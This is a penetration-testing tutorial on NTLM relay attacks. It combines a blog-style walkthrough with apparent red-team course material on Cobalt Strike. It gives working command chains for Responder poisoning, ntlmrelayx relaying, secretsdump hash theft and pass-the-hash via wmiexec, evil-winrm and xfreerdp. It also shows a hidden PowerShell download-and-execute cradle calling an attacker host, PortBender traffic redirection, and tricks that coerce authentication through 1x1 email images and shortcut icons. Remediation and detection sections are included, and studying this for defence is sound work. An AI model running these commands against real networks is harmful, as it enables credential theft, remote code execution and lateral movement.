# NTLM Relaying

With the rise of PetitPotam recently, I was inspired to do a bit more research into NTLM Relaying as a whole. So I spent a while reading through different techniques and managed to combine two ideas that I had seen often, Responder/NTLMRelayx and Pass-The-Hash on some of my work engagements to significant effect. These techniques have been known for years, but still see use inside environments that have not implemented strong network security.

For experienced pentesters, this probably isn’t anything groundbreaking or new, but I hadn’t seen a complete attack chain like this post anywhere else, so I figured I might as well write it up.

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788081/qvwpiukv5pqdpl5tk4xb.png)

NTLM relay has been used and reused in several attacks

* [Remote Potato](https://pentestlab.blog/2021/05/04/remote-potato-from-domain-user-to-enterprise-admin/) by [Antonio Cocomazzi](https://twitter.com/splinter\_code) and [Andrea Pierini](https://twitter.com/decoder\_it)
* [MSRPC Printer Spooler Relay](https://www.crowdstrike.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/) by Eyal Karni and Alex Ionescu
* [PetitPotam](https://github.com/topotam/PetitPotam) by [Gilles Lionel](https://twitter.com/topotam77) is the newest way to trigger computer authentication

Example Attack Path

> Note: All the examples below are on a personal test domain, so yes, the passwords are easily crackable for this example.

### NTLM Relaying

Before diving into the technical details, let’s review NTLM Relaying and outline the conditions necessary for exploitation. Windows New Technology Lan Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate and authorize users on Windows computers. NTLM is a challenge/response style protocol whereby the result is a Net-NTLMv1 or v2 Hash. This hash is relatively low-resource to crack, but when strong security policies of random, long passwords are followed, it holds up well. However, Net-NTLM hashes **can not** be used for Pass-The-Hash (PTH) attacks, only the local NTLM hashes on the victim machine itself.

To get around this, we capture the Net-NTLM hashes in a SOCKS server relay and use this authentication to pull the local NTLM hashes from a machine. With these hashes in hand, we can then proceed down the standard PTH attack path. For PTH, I will showcase 3 different methods of using NTLM hashes and explain why one might be helpful over another one, based on real-world engagements, including avoiding anti-virus.

For more technical dive into the different Windows authentication protocols, I recommend reading [https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4), an excellent write-up on the differing pieces.

### Prerequisites

1. Layer 2 access to the Local Area Network
2. [Impacket](https://github.com/SecureAuthCorp/impacket) installed on Linux (preferably Kali since it comes pre-installed with all tools needed)
3. SMB Signing disabled on victim endpoint (Can easily check with crackmapexec).

### Identify SMB Signing with CrackMapExec

The first step for this attack path is to gather a list of IPs in the LAN that have SMB Signing Disabled. SMB Signing is a security feature that prevents replay attacks. However, it is often disabled to support legacy devices or improve network speeds. It’s easy to locate computers without signing using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec):

`crackmapexec smb — gen-relay-list smb_targets.txt 192.168.1.0/24`

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788082/gneos71frwe3icijyyoo.png)

Output of CrackMapExec against the local subnet

This command shows you all the devices in the subnet that have signing disabled and outputs the IPs in a convenient list that can be used later on. For our example, the DC01 Domain Controller shows that signing is disabled.

### NTLMRelayx

Now that we have our lists of targets (smb\_targets.txt), we can set up [NTLMRelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py), my relay of choice due to its integration with Responder. If you run into issues with finding the script, make sure Impacket is installed correctly.

`ntlmrelayx.py -socks -smb2support -tf smb_targets.txt`

> Note: For my network, the -smb2support flag is unnecessary since SMBv1 is supported, however often, SMBv1 is disabled so it’s good to include the flag.

The -tf flag automatically tests any captured credentials against the list of IPs in the file and the -socks flag opens up a SOCKS server on port 1080 that we will use to relay captured credentials.

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788083/afunigizdbbvhtc1dker.png)

Ntlmrelayx.py activation

### Proxychains

To send requests through the SOCKS proxy created, we use proxychains. Edit /etc/proxychains4.conf with `sudo nano /etc/proxychains4.conf` and change the last line to be `socks4 127.0.0.1 1080` to point at the newly created SOCKS server.

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788084/jxslvv92ugqkdijtfmjt.png)

Proxychains configuration

### Responder

Now that the prerequisites are out of the way, lets get the fun part set up!

[Responder](https://github.com/lgandx/Responder) is a well-known LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay that will automatically capture any requests on the network. Since ntlmrelayx.py uses the SMB/HTTP ports itself, make sure to disable the Responder ports by editing the appropriate lines in `/etc/responder/Responder.conf` from On to Off.

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788085/qy0vokucogipeqcjrqz6.png)

Responder Configuration

Then start up Responder on the correct interface, eth0 in my case.

`sudo responder -I eth0 --analyze --lm --disable-ess`

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788086/lhc7zku6oaur7cwlfpz9.png)

Responder startup

At this point, it’s just a waiting game to capture credentials on the network. If social engineering is in-scope, you can attempt to have a user load a network share with an incorrect name, which will often trigger LLMNR or NBT-NS broadcasts that Responder can poison.

### Methods to gain hash

1. If you have some form of command execution on an endpoint, have that endpoint attempt to connect to a fake share via CMD or Run.

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788087/ai35tzyd4zfxfj8ud3jw.png)

Coercing a NTLMv2 hash via CMD

2\. Alternatively, if social engineering is in scope, you can email the user a link to this fake network share and try to get them to click it to load instead.

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788088/d37cw1dmiyantcrmlaqc.png)

Responder catching the requests made

### SOCKS connection

Whether by time or exploitation, you should start to see sessions being initiated in the ntlmrelayx output. To see the full list of captured sessions, type `socks` in the ntlmrelayx console and you will see the target IP, User, and even if that user is an Admin.

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788088/ijboibwqwcmu8hbprf2j.png)

Ntlmrelayx socks output

If the user you have captured has SMB rights to the target, and there is no Anti-Virus or other network blocks in place, you can utilize [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) through proxychains to gain command execution against the endpoint. It’s important to note that psexec.py does not work, because it opens multiple connections and the SOCKS server doesn’t know how to handle that.

`proxychains4 -q smbexec.py test/testadmin:test@192.168.1.161`

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788089/ywuodtd9roaaknmraups.png)

smbexec via captured login session

However, I have found that this direct path doesn’t often work, usually due to Anti-Virus or EDR catching the service created by smbexec. To work around this issue I found that taking the extra steps of pulling the local hashes and using them in a PTH attack worked far better.

### Secretsdump

The first step is to get the local NTLM hashes for the target. To do this we use Impacket’s [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) which uses a variety of techniques to dump the local and domain hashes. We have to make sure to route the request through our SOCKS proxy by using proxychains.

`proxychains4 -q secretsdump.py test/Testadmin:test@192.168.1.161`

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788091/wthgqro1sifaoio4yukp.png)

Secretsdump.py to pull local hashes

> Note: For my example I had to add in the -use-vss flag to pull the hashes. Also, since the credentials are relayed through the SOCKS server, the password you put in does not matter.

Most of the time you want the local SAM hashes, but since our target is a Domain Controller, which doesn’t have local accounts, we want the Domain Credentials dumped via NTDS: “Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::”.

### Pass-The-Hash

Now that we have translated our captured Net-NTLM login into a local Admin NTLM hash, we can attempt to pass said hash to gain internal access to the machine. There are 3 main methods I have used to significant effect:

1. [Wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)

Wmiexec is another Impacket remote command that uses WMIC to send commands and can bypass AV that catches smbexec.

```
wmiexec.py -hashes ‘00000000000000000000000000000000:2b576acbe6bcfda7294d6bd18041b8fe’ administrator@192.168.1.161
```

> Note: You have to replace the front part of the NTLM hash with 0’s in order for this to work.

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788091/njmgghbbiste4tx2wu8q.png)

wmicexec.py to bypass AV

2\. [Evil-WinRm](https://github.com/Hackplayers/evil-winrm)

If WINRM is enabled on the endpoint, the awesome tool Evil-WinRm supports using hashes. This is a very silent attack and is not often caught by any security solutions.

```
evil-winrm -u Administrator -H ‘2b576acbe6bcfda7294d6bd18041b8fe’ -i 192.168.1.161
```

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788092/djzlqkrlmhy0nbwpxy8i.png)

Evil-WinRM PTH

3\. [XfreeRDP](https://linux.die.net/man/1/xfreerdp)

For a more GUI centered attack, can use Xfreerdp to gain RDP access to an endpoint.

```
xfreerdp /u:Administrator /pth:2b576acbe6bcfda7294d6bd18041b8fe /v:192.168.1.161
```

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788093/yw1kaffqbxq5qjmctf7q.png)

XfreeRDP access via PTH

With any of these access levels, an attacker should be able to escalate up, shut down defenses, and otherwise move through the environment with little effort. While this attack was against a Domain Controller, the basic process of capturing Admin login -> Secretsdump -> PTH should work for any endpoint.

### Remediation

1. Enable SMB Signing
2. Disable LLMNR
3. Disable NBT-NS
4. Monitoring

### Enable SMB Signing

The simplest solution is to enable SMB signing on the network, which would immediately prevent relay attacks. However, it’s important to confirm that there is no legacy equipment that this change would impact.

In the **Group Policy Management Editor** window, in the console tree, go to Computer Configuration/Policies/Windows Settings/Security Settings/Local Policies/Security Options.

In the details pane, double-click **Microsoft network server: Digitally sign communications (always)**.

Verify that the **Define this policy setting** check box is selected, click **Enabled** to enable SMB packet signing, and then click **OK**

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788094/enb0v2erfvk6s41k6mri.png)

Enabling SMB Signing

> Remediation steps pulled from [http://mctexpert.blogspot.com/2011/02/disable-smb-signing.html](http://mctexpert.blogspot.com/2011/02/disable-smb-signing.html).

### **Disabling LLMNR**

1. Open the Group Policy Editor in your version of Windows
2. Navigate to Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client
3. Under DNS Client, make sure that “Turn OFF Multicast Name Resolution” is set to Enabled

### **Disabling NBT-NS**

1. Open your Network Connections and view the properties of your network adapter.
2. Select Internet Protocol Version 4 (TCP/IPv4) and click on Properties.
3. On the General tab click Advanced and navigate to the WINS tab, then select “Disable NetBIOS over TCP/IP.

Disabling LLMNR and NTB-NS will prevent credentials from being caught by tools like Responder, which protects from attackers attempting to crack those credentials. Ensure that both of these protocols are disabled, since Windows defaults to using the other when the other fails/is disabled.

> Remediation steps pulled from [https://cccsecuritycenter.org/remediation/llmnr-nbt-ns](https://cccsecuritycenter.org/remediation/llmnr-nbt-ns).

### **Monitoring**

Hosts should be monitored for (1) traffic on LLMNR and NBT-NS ports (UDP 5355 and 137), (2) event logs with event IDs 4697 and 7045 (relevant to relay attacks) and (3) changes to registry DWORD _EnableMulticast_ under _HKLM\Software\Policies\Microsoft\Windows NT\DNSClient_.

## Real scenario (cobalt)

NTLM authentication uses a 3-way handshake between a client and server. The high-level steps are as follows:

1. The client makes an authentication request to a server for a resource it wants to access.
2. The server sends a challenge to the client - the client needs to encrypt the challenge using the hash of their password.
3. The client sends the encrypted response to the server, which contacts a domain controller to verify the encrypted challenge is correct.

In an NTLM relay attack, an attacker is able to intercept or capture this authentication traffic and effectively allows them to impersonate the client against the same, or another service. For instance, a client attempts to connect to Service A, but the attacker intercepts the authentication traffic and uses it to connect to Service B as though they were the client.

During an on-premise penetration test, NTLM relaying with tools like [Responder](https://github.com/lgandx/Responder) and [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx) is quite trivial. However, it's a different story with this style of red team assessment, not least because we can't typically run Python tools on Windows. Port 445 is always bound and in use by Windows - even local admins can't arbitrarily redirect traffic bound to this port or bind another tool to this port.

It's still possible to do with Cobalt Strike, but requires the use of multiple capabilities simultaneously.

1. Use a [driver](https://reqrypt.org/windivert.html) to redirect traffic destined for port 445 to another port (e.g. 8445) that we can bind to.
2. Use a reverse port forward on the port the SMB traffic is being redirected to. This will tunnel the SMB traffic over the C2 channel to our Team Server.
3. The tool of choice (ntlmrelayx) will be listening for SMB traffic on the Team Server.
4. A SOCKS proxy is required to allow ntlmrelayx to send traffic back into the target network.

The flow looks something like this:

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788095/fqdar8uxuwsw9dwnvuk8.png)

[PortBender](https://github.com/praetorian-inc/PortBender) is a reflective DLL and Aggressor script specifically designed to help facilitate this through Cobalt Strike. It requires local admin access in order for the driver to be loaded, and that the driver be located in the current working directory of the Beacon. It makes sense to use `C:\Windows\System32\drivers` since this is where most Windows drivers go.

```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> pwd
[*] Current directory is C:\Windows\system32\drivers

beacon> upload C:\Tools\PortBender\WinDivert64.sys
```

Next, load `PortBender.cna` from `C:\Tools\PortBender` - this adds a new `PortBender` command to the console.

```
beacon> help PortBender
Redirect Usage: PortBender redirect FakeDstPort RedirectedPort
Backdoor Usage: PortBender backdoor FakeDstPort RedirectedPort Password
Examples:
PortBender redirect 445 8445
PortBender backdoor 443 3389 praetorian.antihacker
```

Execute PortBender to redirect traffic from 445 to port 8445.

This pretty much breaks any SMB service on the machine.

```
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP
```

Next, create a reverse port forward that will then relay the traffic from port 8445 to port 445 on the Team Server (where ntlmrelayx will be waiting).

```
beacon> rportfwd 8445 127.0.0.1 445
[+] started reverse port forward on 8445 to 127.0.0.1:445
```

We also need the SOCKS proxy so that ntlmrelayx can send responses to the target machine.

```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```

On WKSTN-2, attempt to access WKSTN-1 over SMB.

```
H:\>hostname
wkstn-2

H:\>whoami
dev\nlamb

H:\>dir \\10.10.17.231\blah
```

PortBender will log the connection:

```
New connection from 10.10.17.132:50332 to 10.10.17.231:445
Disconnect from 10.10.17.132:50332 to 10.10.17.231:445
```

ntlmrelayx will then spring into action. By default it will use [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to dump the local SAM hashes from the target machine. In this example, I'm relaying from WKSTN-2 to SRV-2.

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788095/mvwnna8my3rrjjoojhvp.png)

Local NTLM hashes could then be cracked or used with pass-the-hash.

```
beacon> pth .\Administrator b423cdd3ad21718de4490d9344afef72

beacon> jump psexec64 srv-2 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_a3) on srv-2 via Service Control Manager (\\srv-2\ADMIN$\3695e43.exe)
Started service 3695e43 on srv-2
[+] established link to child beacon: 10.10.17.68
```

Instead of being limited to dumping NTLM hashes, ntlmrelayx also allows you to execute an arbitrary command against the target. In this example, I download and execute a PowerShell payload.

```
root@kali:~# proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c
'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
```

After seeing the hit on the web log, connect to the waiting Beacon.

```
07/23 16:28:27 visit (port 80) from: 10.10.5.120
Request: GET /b
page Scripted Web Delivery (powershell)
null

beacon> link srv-2
[*] Tasked to link to \\srv-2\pipe\msagent_a3
[+] host called home, sent: 32 bytes
[+] established link to child beacon: 10.10.17.68
```

![.gitbook/assets/1663788082.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788096/k2x71vqnrjcnhwjkcp2n.png)

To stop PortBender, stop the job and kill the spawned process.

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    1240  PortBender

beacon> jobkill 0
beacon> kill 1240
```

One of the main indicators of this activity is the driver load event for WinDivert. You can find driver loads in Kibana using Sysmon Event ID 6. Even though the WinDivert driver has a valid signature, seeing a unique driver load on only one machine is an anomalous event.

```
event.module: sysmon and event.code: 6 and not file.code_signature.subject_name: "Amazon Web Services, Inc."
```

As hinted above, the PortBender CNA uses the [bdllspawn](https://www.cobaltstrike.com/aggressor-script/functions.html#bdllspawn) function to spawn a new process and inject the reflective DLL into. By default, this is rundll32 and will be logged under Sysmon Event ID 1.

**EXERCISE**

Perform the attack above and find the driver load in Kibana.

#### Forcing NTLM Authentication

In the real world, it's unlikely you can just jump onto the console of a machine as a privileged user and authenticate to your malicious SMB server. You can of course just wait for a random event to occur, or try to socially engineer a privileged user. However, there are also lots of techniques to "force" users to unknowingly trigger NTLM authentication attempts to your endpoint.

Here are a few possibilities.

**1x1 Images in Emails**

If you have control over an inbox, you can send emails that have an invisible 1x1 image embedded in the body. When the recipients view the email in their mail client, such as Outlook, it will attempt to download the image over the UNC path and trigger an NTLM authentication attempt.

```
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

A sneakier means would be to modify the sender's email signature, so that even legitimate emails they send will trigger NTLM authentication from every recipient who reads them.

**EXERCISE**

Send an email from _bfarmer_ to _nlamb_ and view the email in Outlook on WKSTN-2.

**Windows Shortcuts**

A Windows shortcut can have multiple properties including a target, working directory and an icon. Creating a shortcut with the icon property pointing to a UNC path will trigger an NTLM authentication attempt when it's viewed in Explorer (it doesn't even have to be clicked).

The easiest way to create a shortcut is with PowerShell.

```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.17.231\test.ico"
$shortcut.Save()
```

A good location for these is on publicly readable shares.
